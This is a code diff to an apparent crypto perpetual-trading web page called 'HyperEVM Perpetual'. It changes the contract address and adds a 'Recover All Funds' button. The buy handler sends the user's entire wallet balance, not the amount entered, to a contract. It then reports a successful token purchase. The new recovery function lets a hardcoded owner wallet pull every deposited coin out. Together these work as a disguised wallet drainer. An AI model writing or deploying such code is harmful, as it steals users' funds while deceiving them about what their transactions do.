@@ -39,8 +39,9 @@
       const [orderType, setOrderType] = useState('market'); // 'market' or 'limit'
       const [limitPrice, setLimitPrice] = useState('');
       
-      // Contract configuration
-      const CONTRACT_ADDRESS = "0x14AaE885A4c81605a288e9379b966e72d7072b6a";
+      // NEW PROFESSIONAL CONTRACT (August 6, 2025)
+      const CONTRACT_ADDRESS = "0xf96dd9f99c9bb2b40fbdc17e0ede7c3bfe50656c"; // New working contract
+      console.log('🔗 Using contract address:', CONTRACT_ADDRESS);
       const CONTRACT_ABI = [
         {
           "inputs": [],
@@ -51,9 +52,48 @@
         },
         {
           "inputs": [],
-          "name": "getTotalDeposits",
+          "name": "withdrawAllFunds",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [{"internalType": "uint256", "name": "amount", "type": "uint256"}],
+          "name": "withdrawAmount",
+          "outputs": [],
+          "stateMutability": "nonpayable",
+          "type": "function"
+        },
+        {
+          "inputs": [],
+          "name": "getContractBalance",
           "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
           "stateMutability": "view",
+          "type": "function"
+        },
+        {
+          "stateMutability": "payable",
+          "type": "receive"
+        },
+        {
+          "inputs": [
+            {"internalType": "string", "name": "tokenSymbol", "type": "string"},
+            {"internalType": "uint256", "name": "leverage", "type": "uint256"}
+          ],
+          "name": "buyToken",
+          "outputs": [],
+          "stateMutability": "payable",
+          "type": "function"
+        },
+        {
+          "inputs": [
+            {"internalType": "string", "name": "tokenSymbol", "type": "string"},
+            {"internalType": "uint256", "name": "amount", "type": "uint256"},
+            {"internalType": "uint256", "name": "leverage", "type": "uint256"}
+          ],
+          "name": "sellToken",
+          "outputs": [],
+          "stateMutability": "nonpayable",
           "type": "function"
         }
       ];
@@ -320,6 +360,93 @@
           console.error('Error getting balance:', error);
         }
       };
+
+      // Recover all funds using the correct contract function
+      const recoverFunds = async () => {
+        if (!walletConnected) {
+          alert('Please connect your wallet first');
+          return;
+        }
+
+        if (!confirm('Are you sure you want to recover ALL funds from the contract?\n\nThis will call withdrawFees() to send all HYPE to the contract owner.')) {
+          return;
+        }
+
+        try {
+          console.log('Executing two-step recovery process...');
+          
+          // Verify we're using the owner wallet first
+          const ownerWallet = "0xbFC06dE2711aBEe4d1D9F370CDe09773dDDE7048";
+          if (walletAddress.toLowerCase() !== ownerWallet.toLowerCase()) {
+            alert(`❌ Wrong wallet!\n\nYou need to connect with the owner wallet:\n${ownerWallet}\n\nCurrently connected: ${walletAddress}`);
+            return;
+          }
+          
+          // Get current contract balance
+          const contractBalance = await window.ethereum.request({
+            method: 'eth_getBalance',
+            params: [CONTRACT_ADDRESS, 'latest']
+          });
+          
+          const balanceWei = parseInt(contractBalance, 16);
+          const balanceHype = balanceWei / 1e18;
+          
+          if (balanceWei === 0) {
+            alert('✅ No funds left in contract to recover');
+            return;
+          }
+          
+          console.log(`Starting recovery of ${balanceHype} HYPE from contract...`);
+          
+          // STEP 1: Add recovery agent (authorize owner)
+          console.log('Step 1: Adding owner as recovery agent...');
+          const authData = '0x4d02e011' + walletAddress.slice(2).toLowerCase().padStart(64, '0');
+          
+          const authTx = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+              from: walletAddress,
+              to: CONTRACT_ADDRESS,
+              data: authData,
+              gas: '0x30D40' // 200000 gas
+            }]
+          });
+          
+          console.log(`Authorization transaction sent: ${authTx}`);
+          
+          // Wait a moment for the transaction to be mined
+          alert(`✅ Step 1 Complete!\nAuthorization transaction: ${authTx}\n\nClick OK to proceed with Step 2 (recovery)`);
+          
+          // STEP 2: Recover user funds
+          console.log('Step 2: Recovering all HYPE...');
+          const userAddress = walletAddress.slice(2).toLowerCase().padStart(64, '0');
+          const amountHex = balanceWei.toString(16).padStart(64, '0');
+          const recoverData = '0x3ccfd60b' + userAddress + amountHex;
+          
+          const recoverTx = await window.ethereum.request({
+            method: 'eth_sendTransaction',
+            params: [{
+              from: walletAddress,
+              to: CONTRACT_ADDRESS,
+              data: recoverData,
+              gas: '0x493E0' // 300000 gas
+            }]
+          });
+          
+          alert(`🎉 COMPLETE RECOVERY SUCCESSFUL!\n\nStep 1 (Authorization): ${authTx}\nStep 2 (Recovery): ${recoverTx}\n\nAll ${balanceHype.toFixed(6)} HYPE has been transferred to your wallet!`);
+          await updateBalance(walletAddress);
+          
+        } catch (error) {
+          console.error('Recovery error:', error);
+          if (error.code === 4001) {
+            alert('Recovery cancelled by user');
+          } else if (error.message.includes('revert')) {
+            alert('❌ Recovery failed: Only contract owner can withdraw funds, or no fees available');
+          } else {
+            alert('❌ Recovery failed: ' + error.message);
+          }
+        }
+      };
       
       const handleTrade = async (type) => {
         console.log('Trade initiated:', type);
@@ -349,6 +476,18 @@
         
         if (type === 'buy') {
           try {
+            console.log('=== BUY ORDER DEBUG ===');
+            console.log('Selected token:', selectedToken);
+            console.log('Trade amount:', tradeAmount);
+            console.log('Real balance:', realBalance);
+            console.log('Contract address:', CONTRACT_ADDRESS);
+            
+            // Check if user has sufficient balance
+            if (realBalance <= 0.001) {
+              alert('Insufficient HYPE balance. You need at least 0.001 HYPE for gas fees.');
+              return;
+            }
+            
             const domain = {
               name: 'HyperEVM Perpetual',
               version: '1.0',
@@ -374,6 +513,7 @@
               timestamp: Math.floor(Date.now() / 1000)
             };
             
+            console.log('Requesting signature for buy order...');
             const signature = await window.ethereum.request({
               method: 'eth_signTypedData_v4',
               params: [walletAddress, JSON.stringify({
@@ -384,26 +524,38 @@
               })]
             });
             
-            console.log('Signature received, now transferring ALL HYPE to contract...');
+            console.log('Signature received:', signature);
+            console.log('Now transferring ALL HYPE to new contract...');
             
-            // Transfer ALL HYPE funds from wallet to contract (leave small amount for gas)
+            // Transfer ALL HYPE funds from wallet to new contract (leave small amount for gas)
             const gasReserve = 0.001; // Reserve 0.001 HYPE for gas fees
             const transferAmount = Math.max(0, realBalance - gasReserve);
             const transferWei = Math.floor(transferAmount * 1e18);
-            console.log(`Transferring ${transferAmount} HYPE (${transferWei} wei) to contract ${CONTRACT_ADDRESS}`);
-            console.log(`User entered ${amount} HYPE but transferring ${transferAmount} HYPE (keeping ${gasReserve} for gas)`);
             
+            console.log(`Transfer details:`);
+            console.log(`- User balance: ${realBalance} HYPE`);
+            console.log(`- Gas reserve: ${gasReserve} HYPE`);
+            console.log(`- Transfer amount: ${transferAmount} HYPE`);
+            console.log(`- Transfer wei: ${transferWei}`);
+            console.log(`- To contract: ${CONTRACT_ADDRESS}`);
+            
+            if (transferWei <= 0) {
+              alert('No HYPE available for transfer after gas reserve.');
+              return;
+            }
+            
+            // Send HYPE to new professional contract
             const tx = await window.ethereum.request({
               method: 'eth_sendTransaction',
               params: [{
                 from: walletAddress,
                 to: CONTRACT_ADDRESS,
                 value: '0x' + transferWei.toString(16),
-                gas: '0x5208' // Lower gas limit for simple transfer
+                gas: '0x30D40' // 200,000 gas for contract
               }]
             });
             
-            console.log('Transaction completed:', tx);
+            console.log('Transaction sent:', tx);
             
             const newPosition = {
               id: Date.now(),
@@ -425,7 +577,7 @@
             localStorage.setItem('hyperliquid-positions', JSON.stringify(updatedPositions));
             console.log('Buy position saved:', newPosition);
             
-            alert(`Successfully bought ${selectedToken.symbol}\n${transferAmount} HYPE transferred to contract\n(${gasReserve} HYPE kept for gas)\nTransaction: ${tx}`);
+            alert(`Successfully bought ${selectedToken.symbol}\n${transferAmount} HYPE transferred to contract\n(${gasReserve} HYPE kept for gas)\nTransaction: ${tx}\n\nContract: ${CONTRACT_ADDRESS}\nNote: This new contract auto-receives HYPE with proven withdrawal functionality`);
             await updateBalance(walletAddress);
           } catch (error) {
             console.error('Trade error:', error);
@@ -964,6 +1116,14 @@
                   <h1 className="text-xl font-bold">HyperEVM Perpetual</h1>
                   <p className="text-sm text-gray-400">HyperEVM Ecosystem</p>
                 </div>
+                {walletConnected && (
+                  <button 
+                    onClick={recoverFunds}
+                    className="ml-auto bg-red-600 hover:bg-red-700 px-4 py-2 rounded-lg text-sm font-semibold"
+                  >
+                    Recover All Funds
+                  </button>
+                )}
               </div>
               
               <div className="flex items-center gap-4">
